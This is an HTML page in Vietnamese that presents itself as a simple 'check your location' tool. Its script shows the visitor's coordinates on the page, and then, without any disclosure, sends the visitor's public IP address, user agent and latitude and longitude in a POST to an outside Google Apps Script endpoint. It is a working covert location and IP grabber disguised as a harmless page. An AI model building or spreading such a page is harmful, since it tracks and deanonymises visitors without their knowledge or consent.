<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vị trí của bạn</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
      }
    </style>
  </head>
  <body>
    <h1>Kiểm tra vị trí của bạn</h1>
    <button id="getLocationBtn">Lấy vị trí</button>
    <div id="locationInfo"></div>

    <script>
      document.getElementById("getLocationBtn").addEventListener("click", function () {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(function (position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Hiển thị vị trí người dùng trên trang
            document.getElementById("locationInfo").innerHTML = `Vị trí của bạn: <br> Vĩ độ: ${lat} <br> Kinh độ: ${lon}`;

            // Lấy thông tin IP và User-Agent
            fetch("https://api.ipify.org?format=json")
              .then(response => response.json())
              .then(data => {
                const ip = data.ip;
                const ua = navigator.userAgent;

                // Gửi yêu cầu POST với IP, UA và vị trí
                fetch("https://script.google.com/macros/s/AKfycbync2dl9TRnWRGAIKBWweAQ-8eOj3fqrxaqiNN_X2JdY7DsHatR6-4gZacpM6x_7Ju1/exec", {
                  method: "POST",  // Đảm bảo là POST
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                  },
                  body: `ip=${ip}&ua=${encodeURIComponent(ua)}&lat=${lat}&lon=${lon}`  // Gửi IP, UA và vị trí
                })
                  .then(response => response.text())
                  .then(data => {
                    console.log("Server Response:", data);  // Kiểm tra phản hồi từ server
                  })
                  .catch(error => console.error("Error:", error));  // Xử lý lỗi
              })
              .catch(error => console.error("Error fetching IP:", error));  // Xử lý lỗi khi lấy IP

          }, function (error) {
            console.log("Lỗi khi lấy vị trí: " + error.message);
          });
        } else {
          console.log("Trình duyệt của bạn không hỗ trợ Geolocation.");
        }
      });
    </script>
  </body>
</html>
